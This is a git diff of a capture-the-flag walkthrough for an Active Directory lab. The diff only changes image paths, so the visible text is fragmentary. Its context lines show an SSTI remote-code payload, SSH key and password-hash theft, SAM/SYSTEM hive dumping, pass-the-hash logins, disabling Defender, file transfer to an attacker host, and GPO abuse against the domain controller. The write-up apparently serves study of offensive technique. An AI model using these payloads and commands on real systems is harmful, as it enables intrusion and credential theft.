@@ -1,6 +1,6 @@
 # Odyssey (Hard) - Odyssey
 
-![image.png](<../.gitbook/assets/image (15).png>)
+![image.png](<../../.gitbook/assets/image (15).png>)
 
 ## Objective / Scope
 
@@ -145,7 +145,7 @@ To-Do List
 
 NB - I am not going to look into all of these but its worth checking
 
-![image.png](<../.gitbook/assets/image 1 (14).png>)
+![image.png](<../../.gitbook/assets/image 1 (14).png>)
 
 * `Internal Template Preview Service` is the single most important phrase on the page
 * To an attacker, this strongly implies `Server-side template rendering`
@@ -153,30 +153,30 @@ NB - I am not going to look into all of these but its worth checking
 * We also checked on the other web functionality but nothing of interest yet.
 * Lets go ahead and test for `SSTI`
 
-![image.png](<../.gitbook/assets/image 2 (14).png>)
+![image.png](<../../.gitbook/assets/image 2 (14).png>)
 
-![image.png](<../.gitbook/assets/image 3 (14).png>)
+![image.png](<../../.gitbook/assets/image 3 (14).png>)
 
-![image.png](<../.gitbook/assets/image 4 (14).png>)
+![image.png](<../../.gitbook/assets/image 4 (14).png>)
 
 ### Testing for SSTI
 
-![image.png](<../.gitbook/assets/image 5 (14).png>)
+![image.png](<../../.gitbook/assets/image 5 (14).png>)
 
 * Used `{{7*'7'}}` and if it returns the value 49, we can conclude that it is vulnerable
 * We can use this resource [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python) .
 
-![image.png](<../.gitbook/assets/image 6 (12).png>)
+![image.png](<../../.gitbook/assets/image 6 (12).png>)
 
 ### Server-Side Template Injection (SSTI) Remote Code Execution payload
 
-![image.png](<../.gitbook/assets/image 7 (13).png>)
+![image.png](<../../.gitbook/assets/image 7 (13).png>)
 
 ```bash
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
-![image.png](<../.gitbook/assets/image 8 (13).png>)
+![image.png](<../../.gitbook/assets/image 8 (13).png>)
 
 * The web application just ran a command on the server **as the user `ghill_sa`**
 * `ghill_sa` strongly suggests a service account ~~HOPEFULLY.~~
@@ -191,13 +191,13 @@ NB - I am not going to look into all of these but its worth checking
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 9 (13).png>)
+    ![image.png](<../../.gitbook/assets/image 9 (13).png>)
 
-    ![image.png](<../.gitbook/assets/image 10 (13).png>)
+    ![image.png](<../../.gitbook/assets/image 10 (13).png>)
 
     * Successfully obtained a shell as **`ghill_sa`**
 
-    ![image.png](<../.gitbook/assets/image 11 (13).png>)
+    ![image.png](<../../.gitbook/assets/image 11 (13).png>)
 
     * As best practice, you want to ping sweep to find hidden live hosts on the internal network
     *   We can confirm that there are no live hosts
@@ -208,7 +208,7 @@ NB - I am not going to look into all of these but its worth checking
 
 ### **Priv Escalation**
 
-![image.png](<../.gitbook/assets/image 12 (12).png>)
+![image.png](<../../.gitbook/assets/image 12 (12).png>)
 
 * We have ssh keys and the most interesting one is the `id_ed25519` which is the private key
 * We can dump the `id_ed25519` locally and try to ssh as `ghill_sa` or `root` and hopefully we can elevate our privileges
@@ -218,16 +218,16 @@ scp ghill_sa@10.1.243.22:/home/ghill_sa/.ssh/id_ed25519 .
 
 ```
 
-![image.png](<../.gitbook/assets/image 13 (12).png>)
+![image.png](<../../.gitbook/assets/image 13 (12).png>)
 
 ### Root Access
 
-![image.png](<../.gitbook/assets/image 14 (13).png>)
+![image.png](<../../.gitbook/assets/image 14 (13).png>)
 
 * We failed to elevate priv as `ghill_sa` but we were successful as `root`
 *   Now that we are root, we can try and find the password for `ghill_sa`
 
-    ![image.png](<../.gitbook/assets/image 15 (11).png>)
+    ![image.png](<../../.gitbook/assets/image 15 (11).png>)
 
     *   We found `ghill_sa` hash and we can further attempt to crack it
 
@@ -250,9 +250,9 @@ scp ghill_sa@10.1.243.22:/tmp/shadow.txt .
 unshadow shadow.txt password.txt > john_text
 ```
 
-![image.png](<../.gitbook/assets/image 16 (11).png>)
+![image.png](<../../.gitbook/assets/image 16 (11).png>)
 
-![image.png](<../.gitbook/assets/image 17 (12).png>)
+![image.png](<../../.gitbook/assets/image 17 (12).png>)
 
 * It took a while to crack this but we finally got the password
 * Now that we have a valid username `ghill_sa` and a valid password `REDACTED` ,we can try and authenticate to our windows machine `WKST-01.`
@@ -291,7 +291,7 @@ nxc smb 10.1.172.55 -u ghill_sa  -p 'REDACTED' --generate-hosts-file hosts
 
 ```
 
-![image.png](<../.gitbook/assets/image 18 (10).png>)
+![image.png](<../../.gitbook/assets/image 18 (10).png>)
 
 * Add these to `/etc/hosts`
 
@@ -306,7 +306,7 @@ nxc rdp EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'REDACTED'
 nxc winrm EC2AMAZ-NS87CNK.hsm.local -u ghill_sa  -p 'REDACTED'
 ```
 
-![image.png](<../.gitbook/assets/image 19 (12).png>)
+![image.png](<../../.gitbook/assets/image 19 (12).png>)
 
 * We are getting errors when trying to connect with our creds.
 * We can to authentically locally with adding `— local-auth`
@@ -315,7 +315,7 @@ nxc winrm EC2AMAZ-NS87CNK.hsm.local -u ghill_sa  -p 'REDACTED'
 nxc rdp EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'P@ssw0rd!' --local-auth
 ```
 
-![image.png](<../.gitbook/assets/image 20 (11).png>)
+![image.png](<../../.gitbook/assets/image 20 (11).png>)
 
 * We get a `Pwned` and now we can `rdp` to the windows machine
 
@@ -325,19 +325,19 @@ nxc rdp EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'P@ssw0rd!' --local-auth
 xfreerdp3 /v:10.1.172.55 /u:ghill_sa /p:'P@ssw0rd!' +clipboard /dynamic-resolution /drive:$(pwd),share
 ```
 
-![image.png](<../.gitbook/assets/image 21 (12).png>)
+![image.png](<../../.gitbook/assets/image 21 (12).png>)
 
 * Now that we have windows access, what then should we look for?
 
-![image.png](<../.gitbook/assets/image 22 (12).png>)
+![image.png](<../../.gitbook/assets/image 22 (12).png>)
 
-![image.png](<../.gitbook/assets/image 23 (12).png>)
+![image.png](<../../.gitbook/assets/image 23 (12).png>)
 
 * We have found some interacting files and lets read them one by one to see what we can get.
 
-![image.png](<../.gitbook/assets/image 24 (12).png>)
+![image.png](<../../.gitbook/assets/image 24 (12).png>)
 
-![image.png](<../.gitbook/assets/image 25 (12).png>)
+![image.png](<../../.gitbook/assets/image 25 (12).png>)
 
 * A lot of these files contained creds that were not helpful to us.
 
@@ -353,7 +353,7 @@ net localgroup administrators
 
 ```
 
-![image.png](<../.gitbook/assets/image 48 (4).png>)
+![image.png](<../../.gitbook/assets/image 48 (4).png>)
 
 **Check if you can already access admin-only locations**
 
@@ -429,11 +429,11 @@ reg save HKLM\SYSTEM system.save
 
 **Lets run the cmd as administrator**
 
-![image.png](<../.gitbook/assets/image 27 (11).png>)
+![image.png](<../../.gitbook/assets/image 27 (11).png>)
 
-![image.png](<../.gitbook/assets/image 28 (10).png>)
+![image.png](<../../.gitbook/assets/image 28 (10).png>)
 
-![image.png](<../.gitbook/assets/image 48 (4).png>)
+![image.png](<../../.gitbook/assets/image 48 (4).png>)
 
 * `bbarkinson` is a member of administrators.
 * **Group**: `BUILTIN\Backup Operators`
@@ -482,11 +482,11 @@ whoami /priv
 * It is always important to run the `cmd` as an `administrator`.
 * If you’re in the `**Backup Operators** group`, dumping \*\*`SAM**, **SYSTEM**, and **SECURITY**` lets you **extract `local account password hashes`** (and sometimes cached creds) **without being an administrator**, which can then be cracked or reused to escalate privileges.
 
-![image.png](<../.gitbook/assets/image 30 (9).png>)
+![image.png](<../../.gitbook/assets/image 30 (9).png>)
 
 * Making sure to run as an admin
 
-![image.png](<../.gitbook/assets/image 31 (7).png>)
+![image.png](<../../.gitbook/assets/image 31 (7).png>)
 
 * We were successful in saving the `SAM and SYSTEM` but not the `SECURITY.`
 * `Reg save hklm\Security` seem to be blocked. **WHAT DO WE DO NOW??**
@@ -501,14 +501,14 @@ nxc smb EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'P@ssw0rd!' -L
 * We can confirm that we can perform a `backup_operator` module
 * We however need `rpc` to perform this.
 
-![image.png](<../.gitbook/assets/image 32 (6).png>)
+![image.png](<../../.gitbook/assets/image 32 (6).png>)
 
 ```bash
 nxc smb EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p P@ssw0rd! -M backup_operator
 
 ```
 
-![image.png](<../.gitbook/assets/image 33 (7).png>)
+![image.png](<../../.gitbook/assets/image 33 (7).png>)
 
 * This did not work but it was worth trying because we are getting closer to what actually works. `The beauty about rabbit holes.`
 
@@ -529,9 +529,9 @@ end backupX
 
 * We need to create and save this file on our machine then transfer it to our victims machine.
 
-![image.png](<../.gitbook/assets/image 34 (6).png>)
+![image.png](<../../.gitbook/assets/image 34 (6).png>)
 
-![image.png](<../.gitbook/assets/image 35 (5).png>)
+![image.png](<../../.gitbook/assets/image 35 (5).png>)
 
 Now we need to create the `diskshadow`
 
@@ -539,9 +539,9 @@ Now we need to create the `diskshadow`
 diskshadow /s shadow.txt
 ```
 
-![image.png](<../.gitbook/assets/image 36 (5).png>)
+![image.png](<../../.gitbook/assets/image 36 (5).png>)
 
-![image.png](<../.gitbook/assets/image 37 (5).png>)
+![image.png](<../../.gitbook/assets/image 37 (5).png>)
 
 * `diskshadow` bypassed file locks
 * Exposed `C:` snapshot as **`Z:\`**
@@ -557,7 +557,7 @@ diskshadow /s shadow.txt
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 38 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 38 (5).png>)
 
     * `Access is denied` when copying SAM
     * Even through a shadow copy, **`copy` still enforces ACL checks**.
@@ -573,7 +573,7 @@ dir C:\Share
 
 ```
 
-![image.png](<../.gitbook/assets/image 39 (5).png>)
+![image.png](<../../.gitbook/assets/image 39 (5).png>)
 
 * BOOOM we were successful
 * Now i can transfer these files to my local machine.
@@ -590,7 +590,7 @@ copy C:\Share\SECURITY \\10.200.23.220\share\
 
 ```
 
-![image.png](<../.gitbook/assets/image 40 (5).png>)
+![image.png](<../../.gitbook/assets/image 40 (5).png>)
 
 * Could not copy files
 
@@ -604,7 +604,7 @@ certutil -urlcache -f http://10.200.23.220:8000/ C:\Share\SECURITY
 
 ```
 
-![image.png](<../.gitbook/assets/image 41 (4).png>)
+![image.png](<../../.gitbook/assets/image 41 (4).png>)
 
 * I was blocked by `Microsoft Defender Antivirus`
 
@@ -614,9 +614,9 @@ certutil -urlcache -f http://10.200.23.220:8000/ C:\Share\SECURITY
  smbclient //10.1.172.55/C$ -U ghill_sa
 ```
 
-![image.png](<../.gitbook/assets/image 42 (3).png>)
+![image.png](<../../.gitbook/assets/image 42 (3).png>)
 
-![image.png](<../.gitbook/assets/image 43 (3).png>)
+![image.png](<../../.gitbook/assets/image 43 (3).png>)
 
 * Finally managed to pull the hives through `smbclient`
 *   We can use [`secretdump.py`](http://secretdump.py/) from Impacket to extract secrets
@@ -625,7 +625,7 @@ certutil -urlcache -f http://10.200.23.220:8000/ C:\Share\SECURITY
     secretsdump.py -sam SAM -system SYSTEM -security SECURITY local 
     ```
 
-![image.png](<../.gitbook/assets/image 44 (4).png>)
+![image.png](<../../.gitbook/assets/image 44 (4).png>)
 
 * BOOOOOOM we have the hashes
 
@@ -644,9 +644,9 @@ Or
 impacket-wmiexec Administrator@10.1.172.55 -hashes :d5cad8a9782b2879bf316f56936f1e36
 ```
 
-![image.png](<../.gitbook/assets/image 45 (4).png>)
+![image.png](<../../.gitbook/assets/image 45 (4).png>)
 
-![image.png](<../.gitbook/assets/image 46 (4).png>)
+![image.png](<../../.gitbook/assets/image 46 (4).png>)
 
 * BOOOOOOOOOOOM we got another flag
 
@@ -697,14 +697,14 @@ PORT      STATE SERVICE           REASON          VERSION
 * We now need to enumerate for valid users and creds
 * Either we can use the information we got from the hives below to enumerate for valid creds
 
-![image.png](<../.gitbook/assets/image 44 (4).png>)
+![image.png](<../../.gitbook/assets/image 44 (4).png>)
 
 **Or**
 
 * Let me take you back to one of the users which happened to be in the admin group `bbarkinson`
 * We can use this knowledge and verify if the creds are valid or not.
 
-![image.png](<../.gitbook/assets/image 48 (4).png>)
+![image.png](<../../.gitbook/assets/image 48 (4).png>)
 
 ```bash
 bbarkinson:53c3709ae3d9f4428a230db81361ffbc
@@ -719,7 +719,7 @@ nxc smb 10.1.148.114 -d DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db8
 
 ```
 
-![image.png](<../.gitbook/assets/image 49 (4).png>)
+![image.png](<../../.gitbook/assets/image 49 (4).png>)
 
 * We have a set of valid creds
 * Now lets obtain loot using Bloodhound
@@ -738,7 +738,7 @@ bloodhound-ce-python \
 
 ```
 
-![image.png](<../.gitbook/assets/image 50 (3).png>)
+![image.png](<../../.gitbook/assets/image 50 (3).png>)
 
 * The error is basically telling you the `DC is hardened (LDAP signing / LDAPS),` and this Python collector can’t complete a secure LDAP bind in this configuration, which is why the connection gets reset.
 * `LDAP` Authentication is refused because `LDAP signing is enabled`. Trying to connect over LDAPS instead, The DC requires LDAP signing on port 389, so unsigned simple binds are rejected and the tool switches to LDAPS (TCP 636).
@@ -756,7 +756,7 @@ nxc ldap 10.1.148.114 \
   --bloodhound --collection All
 ```
 
-![image.png](<../.gitbook/assets/image 51 (3).png>)
+![image.png](<../../.gitbook/assets/image 51 (3).png>)
 
 * `Connection reset by peer means` DC sent a RST packet to immediately kill your connection
 
@@ -775,7 +775,7 @@ evil-winrm -i 10.1.148.114 -u 'hsm.local\bbarkinson' -H 53c3709ae3d9f4428a230db8
 
 ```
 
-![image.png](<../.gitbook/assets/image 52 (3).png>)
+![image.png](<../../.gitbook/assets/image 52 (3).png>)
 
 * Well i couldn’t get access.
 * Now what’s next…….??????????????????????????
@@ -785,7 +785,7 @@ evil-winrm -i 10.1.148.114 -u 'hsm.local\bbarkinson' -H 53c3709ae3d9f4428a230db8
 * We have compromised `Wks-01` , we now need to try and see if we can reach the domain controller from this workstation.
 *   if we can recall, `wkst-01` had windows defender active. That means if we upload `Sharphound.ps1`, there are higher chances that it might get blocked or detected. Hence we need to find a way to disable it.
 
-    ![image.png](<../.gitbook/assets/image 41 (4).png>)
+    ![image.png](<../../.gitbook/assets/image 41 (4).png>)
 * We also tried to obtain bloodhound loot with various ways and our chance now is running `Sharphound` in `WKS_01.`
 
 ### Connecting to rdp with user `bbarkinson`
@@ -794,7 +794,7 @@ evil-winrm -i 10.1.148.114 -u 'hsm.local\bbarkinson' -H 53c3709ae3d9f4428a230db8
 xfreerdp3 /v:10.1.172.55 /u:bbarkinson /pth:53c3709ae3d9f4428a230db81361ffbc /cert:ignore +clipboard /dynamic-resolution /drive:$PWD,share
 ```
 
-![image.png](<../.gitbook/assets/image 54 (2).png>)
+![image.png](<../../.gitbook/assets/image 54 (2).png>)
 
 * No luck this time **##LOOKS LIKE WE’RE AT A DEAD END AND KEEP HITTING RABBIT HOLES.##**
 * In `Pass-the-Hash` scenarios over RDP, it often signals Restricted Admin Mode rejection or "Allow delegating non-exportable credentials" policy enforcement, forcing plaintext passwords instead.
@@ -814,11 +814,11 @@ nxc smb 10.1.172.55 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 --exec-
 
 ```
 
-![image.png](<../.gitbook/assets/image 55 (2).png>)
+![image.png](<../../.gitbook/assets/image 55 (2).png>)
 
 * I had to try 2 times
 
-![image.png](<../.gitbook/assets/image 56 (2).png>)
+![image.png](<../../.gitbook/assets/image 56 (2).png>)
 
 * Now that `ghill_sa` is a member of local administration, we now have Administration privileges and we can send SharpHound.ps1 https://1337skills.com/cheatsheets/sharphound/#powershell-usage
 
@@ -844,7 +844,7 @@ Invoke-BloodHound `
 
 ```
 
-![image.png](<../.gitbook/assets/image 57 (2).png>)
+![image.png](<../../.gitbook/assets/image 57 (2).png>)
 
 * Windows defender spotted our file and deleted it
 * We can disable it
@@ -853,9 +853,9 @@ Invoke-BloodHound `
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-![image.png](<../.gitbook/assets/image 58 (2).png>)
+![image.png](<../../.gitbook/assets/image 58 (2).png>)
 
-![image.png](<../.gitbook/assets/image 59 (2).png>)
+![image.png](<../../.gitbook/assets/image 59 (2).png>)
 
 * Network/DNS issues: The attacking host cannot resolve `DC01.hsm.local` or cannot route to it.
 * It could also mean a wrong DC hostname / DNS issue. In our case the hostname is correct but there are some DNS issues. If we can also recall, the scope gave us a hint: `The client’s environment is currently in a degraded state due to ongoing migration efforts; the Domain Controllers are experiencing synchronization failures. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.`
@@ -864,7 +864,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 * We can just ping `commonName=DC01.hsm.local`
 
-![image.png](<../.gitbook/assets/image 60 (2).png>)
+![image.png](<../../.gitbook/assets/image 60 (2).png>)
 
 When a workstation cannot ping the `domain controller (DC)`, it typically indicates a connectivity, DNS resolution, or firewall issue breaking basic network communication essential for Active Directory authentication and domain services.
 
@@ -877,26 +877,26 @@ When a workstation cannot ping the `domain controller (DC)`, it typically indica
 
 *   Run `ncpa.cpl`
 
-    ![image.png](<../.gitbook/assets/image 61 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 61 (2).png>)
 
-    ![image.png](<../.gitbook/assets/image 62 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 62 (2).png>)
 
-    ![image.png](<../.gitbook/assets/image 63 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 63 (2).png>)
 
     * **On** `Preferred DNS server` We can provide the IP address of the Domain Controller (DC01). `10.1.148.114`
 
     #### `I reset the lab machine; therefore, the IP addresses have changed`
 
-    ![image.png](<../.gitbook/assets/image 64 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 64 (2).png>)
 
-![image.png](<../.gitbook/assets/image 65 (2).png>)
+![image.png](<../../.gitbook/assets/image 65 (2).png>)
 
-![image.png](<../.gitbook/assets/image 66 (2).png>)
+![image.png](<../../.gitbook/assets/image 66 (2).png>)
 
 * After configuring the DNS we can now reach the Domain Controller.
 * Now we can run SharpHound.ps1
 
-![image.png](<../.gitbook/assets/image 67 (2).png>)
+![image.png](<../../.gitbook/assets/image 67 (2).png>)
 
 * Incorrect password for the current Administrator user on `DC01.hsm.local.`
 * **SharpHound LDAP queries REQUIRE valid domain credentials which we do not have at the moment.** Local admin rights on a member machine are not enough.
@@ -915,7 +915,7 @@ When a workstation cannot ping the `domain controller (DC)`, it typically indica
 nxc ldap 10.0.18.37 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc -M maq
 ```
 
-![image.png](<../.gitbook/assets/image 68 (2).png>)
+![image.png](<../../.gitbook/assets/image 68 (2).png>)
 
 * This means that **Any authenticated domain user** (including `bbarkinson`) can create **up to 10 computer accounts** in the domain.
 
@@ -923,7 +923,7 @@ nxc ldap 10.0.18.37 -u 'bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc -M maq
 nxc smb  10.0.18.37 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'   -M add-computer -o NAME="RedBlue" PASSWORD='RedBlue777' --dns-server 10.0.18.37
 ```
 
-![image.png](<../.gitbook/assets/image 69 (2).png>)
+![image.png](<../../.gitbook/assets/image 69 (2).png>)
 
 * Now you can execute SharpHound.ps1 by providing the machine account's username and password credentials
 
@@ -934,9 +934,9 @@ Invoke-BloodHound -Domain hsm.local -DomainController DC01.hsm.local -ZipFilenam
 
 ```
 
-![image.png](<../.gitbook/assets/image 70 (2).png>)
+![image.png](<../../.gitbook/assets/image 70 (2).png>)
 
-![image.png](<../.gitbook/assets/image 71 (2).png>)
+![image.png](<../../.gitbook/assets/image 71 (2).png>)
 
 * BOOOOOOM At last!!!!!!!!!!!!!
 
@@ -946,36 +946,36 @@ Invoke-BloodHound -Domain hsm.local -DomainController DC01.hsm.local -ZipFilenam
  smbclient //10.0.19.36/C$ -U ghill_sa
 ```
 
-![image.png](<../.gitbook/assets/image 72 (2).png>)
+![image.png](<../../.gitbook/assets/image 72 (2).png>)
 
-![image.png](<../.gitbook/assets/image 73 (2).png>)
+![image.png](<../../.gitbook/assets/image 73 (2).png>)
 
 ## Bloodhound
 
-![image.png](<../.gitbook/assets/image 74 (2).png>)
+![image.png](<../../.gitbook/assets/image 74 (2).png>)
 
-![image.png](<../.gitbook/assets/image 75 (2).png>)
+![image.png](<../../.gitbook/assets/image 75 (2).png>)
 
-![image.png](<../.gitbook/assets/image 76 (2).png>)
+![image.png](<../../.gitbook/assets/image 76 (2).png>)
 
-![image.png](<../.gitbook/assets/image 77 (2).png>)
+![image.png](<../../.gitbook/assets/image 77 (2).png>)
 
 * The user `BBARKINSON@HSM.LOCAL` has generic write access to the `GPO FINANCE POLICY@HSM.LOCAL`.
 * `Generic Write access` grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.
 * With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task
 * \[`pyGPOAbuse.py](http://pygpoabuse.py/)` can be used for that purpose. https://github.com/Hackndo/pyGPOAbuse
 
-![image.png](<../.gitbook/assets/image 78 (2).png>)
+![image.png](<../../.gitbook/assets/image 78 (2).png>)
 
-![image.png](<../.gitbook/assets/image 79 (1).png>)
+![image.png](<../../.gitbook/assets/image 79 (1).png>)
 
-![image.png](<../.gitbook/assets/image 80 (1).png>)
+![image.png](<../../.gitbook/assets/image 80 (1).png>)
 
 ```bash
 python3 pygpoabuse.py hsm.local/bbarkinson -hashes ':53c3709ae3d9f4428a230db81361ffbc' -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2-f
 ```
 
-![image.png](<../.gitbook/assets/image 81 (1).png>)
+![image.png](<../../.gitbook/assets/image 81 (1).png>)
 
 * pyGPOAbuse successfully created a scheduled task named `TASK_0ca6ae7f` in GPO `526CDF3A-10B6-4B00-BCFA-36E59DCD71A2` using bbarkinson credentials.
 
@@ -985,7 +985,7 @@ python3 pygpoabuse.py hsm.local/bbarkinson -hashes ':53c3709ae3d9f4428a230db8136
 nxc smb DC01.hsm.local -u 'john' -p 'H4x00r123..' BOOOOOOOOOOOOOOOOOOOM we get `PWN3D!`
 ```
 
-![image.png](<../.gitbook/assets/image 82 (1).png>)
+![image.png](<../../.gitbook/assets/image 82 (1).png>)
 
 ```bash
 evil-winrm -i DC01.hsm.local -u 'john' -p 'H4x00r123..'
@@ -997,4 +997,4 @@ evil-winrm -i 10.0.18.37 -u john -p 'H4x00r123..'
 * TRY TO REPRODUCE THESE STEPS AND RECOVER THE FLAG
 * UNTIL NEXT TIMEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
 
-![image.png](<../.gitbook/assets/image 83 (1).png>)
+![image.png](<../../.gitbook/assets/image 83 (1).png>)
